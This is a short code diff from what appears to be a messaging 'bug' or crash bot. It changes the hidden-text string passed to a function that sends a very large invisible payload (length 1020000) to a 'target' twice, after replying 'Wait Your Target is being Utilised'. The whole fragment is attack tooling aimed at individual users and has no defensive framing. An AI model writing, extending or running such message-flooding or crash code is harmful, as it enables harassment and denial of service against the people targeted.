@@ -566,7 +566,7 @@ reply(`Wait Your Target is being Utilised`)
         return text.split('').map(char => '' + char).join('');
     };
 
-    const invisibleText = toInvisibleText("SPIDER");
+    const invisibleText = toInvisibleText(".");
 
     for (let i = 0; i < 2; i++) {
         await buk1(sam, target, invisibleText, 1020000, true);
